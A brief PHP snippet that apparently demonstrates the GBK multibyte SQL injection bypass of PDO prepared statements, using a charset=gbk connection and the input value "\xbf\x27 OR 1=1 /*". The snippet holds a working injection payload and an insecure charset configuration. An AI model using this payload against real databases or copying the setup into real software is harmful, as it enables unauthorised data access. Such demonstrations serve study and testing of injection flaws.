<?php
$pdo = new PDO('mysql:host=localhost;dbname=testdb;charset=gbk', $user, $password);
$stmt = $pdo->prepare('SELECT * FROM test WHERE name = ? LIMIT 1');
$stmt->execute(array("\xbf\x27 OR 1=1 /*"));
